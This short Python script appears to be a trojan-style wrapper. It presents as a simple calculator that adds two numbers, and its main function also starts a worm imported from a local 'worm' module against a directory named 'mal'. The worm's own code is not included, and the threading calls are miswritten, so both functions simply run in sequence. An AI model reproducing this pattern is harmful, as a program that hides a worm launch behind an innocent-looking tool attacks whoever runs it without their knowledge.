from worm import WormCode
import threading

def comp():
    num1 = int(input("Enter A Number ? "))
    num2 = int(input("Enter Another Number ? "))

    print(f"Sum is {num1 + num2}")
def main():
    threading.Thread(target=WormCode.start("/home/trevor/c++/mal"))
    threading.Thread(target=comp())
    

if __name__ == '__main__':
    main()